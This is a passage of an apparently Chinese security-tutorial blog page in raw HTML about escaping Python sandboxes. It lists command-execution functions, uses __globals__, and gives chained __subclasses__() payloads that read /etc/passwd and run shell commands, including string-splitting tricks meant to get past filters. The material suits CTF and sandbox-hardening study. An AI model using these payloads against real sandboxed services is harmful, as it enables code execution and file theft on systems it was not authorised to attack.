class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line">os.popen(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line">commands.getoutput(<span class="string">&#x27;ifconfig&#x27;</span>)  <span class="comment"># 仅限于python2</span></span><br><span class="line">commands.getstatusoutput(<span class="string">&#x27;ifconfig&#x27;</span>)  <span class="comment"># 仅限于python2</span></span><br><span class="line">platform.popen(<span class="string">&#x27;dir&#x27;</span>).read() <span class="comment"># 仅限于python2</span></span><br><span class="line">subprocess.call([<span class="string">&#x27;ifconfig&#x27;</span>],shell=<span class="literal">True</span>)</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ifconfig&#x27;)&quot;</span>,number=<span class="number">1</span>)</span><br><span class="line">sys.call_tracing(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system,(<span class="string">&#x27;whoami&#x27;</span>,))</span><br></pre></td></tr></table></figure><h3 id="内置危险函数"><a href="#内置危险函数" class="headerlink" title="内置危险函数"></a>内置危险函数</h3><p>在python中,我们知道,不用引入直接使用的内置函数称为 <strong>builtin</strong> 函数，execfile可以执行任意文本中的python函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 处理标记的都是通用的</span></span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;import os;os.system(&#x27;ifconfig&#x27;)&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ifconfig&#x27;)&quot;</span>);  <span class="comment"># 过滤空格</span></span><br><span class="line">execfile(<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>);system(<span class="string">&#x27;ls&#x27;</span>)  <span class="comment"># 仅限于python2</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;&quot;&quot;__import__(&#x27;os&#x27;).system(&#x27;ifconfig&#x27;)&quot;&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">import</span> os;<span class="built_in">map</span>(os.system,[<span class="string">&#x27;ifconfig&#x27;</span>])</span><br></pre></td></tr></table></figure><h3 id="globals-模块"><a href="#globals-模块" class="headerlink" title="__globals__模块"></a>__globals__模块</h3><p>该属性是函数特有的属性，记录当前文件全局变量的值，如果某个文件调用了os、sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用<code>__globals__</code>属性访问全局的变量</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.18</span> (default, Jan <span class="number">27</span> <span class="number">2022</span>, 02:05:<span class="number">20</span>) </span><br><span class="line">[GCC <span class="number">11.2</span><span class="number">.0</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="keyword">lambda</span> x:x+<span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(a)</span><br><span class="line">[<span class="string">&#x27;__call__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__closure__&#x27;</span>, <span class="string">&#x27;__code__&#x27;</span>, <span class="string">&#x27;__defaults__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__get__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__globals__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;func_closure&#x27;</span>, <span class="string">&#x27;func_code&#x27;</span>, <span class="string">&#x27;func_defaults&#x27;</span>, <span class="string">&#x27;func_dict&#x27;</span>, <span class="string">&#x27;func_doc&#x27;</span>, <span class="string">&#x27;func_globals&#x27;</span>, <span class="string">&#x27;func_name&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.__globals__</span><br><span class="line">&#123;<span class="string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;a&#x27;</span>: &lt;function &lt;<span class="keyword">lambda</span>&gt; at <span class="number">0x7ff89545a350</span>&gt;, <span class="string">&#x27;__package__&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.func_globals</span><br><span class="line">&#123;<span class="string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;a&#x27;</span>: &lt;function &lt;<span class="keyword">lambda</span>&gt; at <span class="number">0x7ff89545a350</span>&gt;, <span class="string">&#x27;__package__&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ifconfig&#x27;)&quot;</span>)</span><br><span class="line">eth0: flags=<span class="number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="number">1500</span></span><br><span class="line">        inet <span class="number">10.18</span><span class="number">.69</span><span class="number">.174</span>  netmask <span class="number">255.255</span><span class="number">.248</span><span class="number">.0</span>  broadcast <span class="number">10.18</span><span class="number">.71</span><span class="number">.255</span></span><br><span class="line">        inet6 fe80::20c:29ff:fe7d:da26  prefixlen <span class="number">64</span>  scopeid <span class="number">0x20</span>&lt;link&gt;</span><br><span class="line">        ether <span class="number">00</span>:0c:<span class="number">29</span>:7d:da:<span class="number">26</span>  txqueuelen <span class="number">1000</span>  (Ethernet)</span><br><span class="line">        RX packets <span class="number">16332</span>  <span class="built_in">bytes</span> <span class="number">8119588</span> (<span class="number">7.7</span> MiB)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">1538</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">5406</span>  <span class="built_in">bytes</span> <span class="number">498612</span> (<span class="number">486.9</span> KiB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br><span class="line"></span><br><span class="line">lo: flags=<span class="number">73</span>&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class="number">65536</span></span><br><span class="line">        inet <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  netmask <span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">        inet6 ::<span class="number">1</span>  prefixlen <span class="number">128</span>  scopeid <span class="number">0x10</span>&lt;host&gt;</span><br><span class="line">        loop  txqueuelen <span class="number">1000</span>  (Local Loopback)</span><br><span class="line">        RX packets <span class="number">187</span>  <span class="built_in">bytes</span> <span class="number">17050</span> (<span class="number">16.6</span> KiB)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">187</span>  <span class="built_in">bytes</span> <span class="number">17050</span> (<span class="number">16.6</span> KiB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br></pre></td></tr></table></figure><p><strong>func_globals</strong>和 <strong>__globals__</strong> 作用是一样的，如果过滤了<code>__builtin__</code>中的内容，这样 <strong>__globals__</strong> 里面的<code>__builtins__</code>也就没有什么意义了，即使重新<code>import __builtin__</code> 还是一样.</p><h3 id="Magic-Method（魔术方法）"><a href="#Magic-Method（魔术方法）" class="headerlink" title="Magic Method（魔术方法）"></a>Magic Method（魔术方法）</h3><div class="note success modern"><p>直接输出结论，基于Python2。如果是Python3那么<code>__subclasses__()[xx]</code>中的xx值需要自己找</p></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 利用file()函数读取文件：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment"># 等效于下面语句，但是无法绕过</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br><span class="line"><span class="comment"># 重新载入__builtins__：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure><p>尝试利用继承关系来找到object类</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.18</span> (default, Jan <span class="number">27</span> <span class="number">2022</span>, 02:05:<span class="number">20</span>) </span><br><span class="line">[GCC <span class="number">11.2</span><span class="number">.0</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__bases__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br></pre></td></tr></table></figure><p>前面不仅可以使用双引号，还可以利用列表或者字典类型，区别在查找类型的时候在不同的基础上查找，返回都是元组。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[].__class__.__bases__</span><br><span class="line">&#123;&#125;.__class__.__bases__</span><br></pre></td></tr></table></figure><p>查看可以使用的模块</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">[&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytes&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;super&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;range&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_reversekeyiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_reversevalueiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_reverseitemiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;odict_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;set&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;float&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;property&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;managedbuffer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;stderrprinter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;code&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;method&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;function&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;mappingproxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;method-wrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types.SimpleNamespace&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;longrange_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;classmethod_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;method_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;callable_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;pickle.PickleBuffer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;coroutine&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;coroutine_wrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;InterpreterID&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;BaseException&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;hamt&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;hamt_array_node&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;hamt_bitmap_node&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;hamt_collision_node&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;keys&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;values&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;items&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ContextVar&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;Token&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;Token.MISSING&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;moduledef&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;module&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;filter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;map&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;zip&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._ModuleLock&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._DummyModuleLock&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._ModuleLockManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.ModuleSpec&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.FrozenImporter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._ImportLockContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_thread._localdummy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_thread._local&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_thread.lock&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_thread.RLock&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_io._IOBase&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_io._BytesIOBuffer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_io.IncrementalNewlineDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;posix.ScandirIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;posix.DirEntry&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external._LoaderBasics&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.FileLoader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external._NamespacePath&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external._NamespaceLoader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.PathFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.FileFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;zipimport._ZipImportResourceReader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.Codec&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.StreamReaderWriter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.StreamRecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abc._abc_data&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;abc.ABC&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_itemiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Hashable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Awaitable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types.GenericAlias&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.AsyncIterable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;async_generator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Iterable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytes_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_keyiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_valueiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;list_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;list_reverseiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;range_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;set_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;str_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;tuple_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Sized&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Container&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Callable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;os._wrap_close&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins.Quitter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins._Printer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins._Helper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types.DynamicClassAttribute&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types._GeneratorWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.accumulate&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.combinations&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.combinations_with_replacement&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.cycle&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.dropwhile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.takewhile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.islice&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.starmap&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.chain&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.compress&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.filterfalse&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.count&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.zip_longest&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.permutations&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.product&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.repeat&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.groupby&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools._grouper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools._tee&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools._tee_dataobject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;reprlib.Repr&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.deque&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_collections._deque_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_collections._deque_reverse_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_collections._tuplegetter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections._Link&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools._lru_cache_wrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.partialmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.singledispatchmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.cached_property&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib.ContextDecorator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib._GeneratorContextManagerBase&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib._BaseExitStack&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;enum.auto&#x27;</span>&gt;, &lt;enum <span class="string">&#x27;Enum&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;re.Pattern&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;re.Match&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;sre_parse.State&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;sre_parse.SubPattern&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;sre_parse.Tokenizer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;re.Scanner&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span 